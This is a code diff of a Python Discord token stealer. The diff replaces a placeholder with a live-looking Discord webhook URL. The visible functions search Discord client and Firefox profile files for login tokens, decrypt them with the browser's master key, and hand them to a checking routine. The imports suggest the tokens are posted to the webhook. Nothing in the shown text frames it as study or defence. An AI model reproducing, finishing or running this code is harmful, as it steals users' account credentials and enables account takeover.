@@ -3,6 +3,8 @@ from re import findall, match
 from json import loads, dumps
 from base64 import b64decode
 from threading import Thread
+import re
+import ntpath
 from urllib.request import Request, urlopen
 import json
 from Crypto.Cipher import AES
@@ -17,7 +19,7 @@ import psutil
 from dhooks import Webhook, File
 import base64
 
-webhook_url = "your webhook url"
+webhook_url = "https://discord.com/api/webhooks/986680080006783037/bXf43qziuRwrOLBf4PHKh7_Ginlfpk0JrSmpDscqcv7hfG24aM160yJY3gh8vZqOkBNh"
 
 try:        
     from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
@@ -432,33 +434,33 @@ paths = {
 }
 def t():
         for name, path in paths.items():
-            if not os.path.exists(path):
+            if not ntpath.exists(path):
                 continue
             disc = name.replace(" ", "").lower()
             if "cord" in path:
-                if os.path.exists(roaming+f'\\{disc}\\Local State'):
+                if ntpath.exists(roaming + f'\\{disc}\\Local State'):
                     for file_name in os.listdir(path):
                         if file_name[-3:] not in ["log", "ldb"]:
                             continue
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                            for y in findall(encrypted_regex, line):
-                                token = decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(roaming+f'\\{disc}\\Local State'))
+                            for y in re.findall(encrypted_regex, line):
+                                token = decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(roaming + f'\\{disc}\\Local State'))
                                 checkToken(token)
             else:
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for token in findall(regex, line):
+                        for token in re.findall(regex, line):
                             checkToken(token)
 
-        if os.path.exists(roaming+"\\Mozilla\\Firefox\\Profiles"):
-            for path, _, files in os.walk(roaming+"\\Mozilla\\Firefox\\Profiles"):
+        if ntpath.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
+            for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
                 for _file in files:
                     if not _file.endswith('.sqlite'):
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
-                        for token in findall(regex, line):
+                        for token in re.findall(regex, line):
                             checkToken(token)
 def main():
     t()
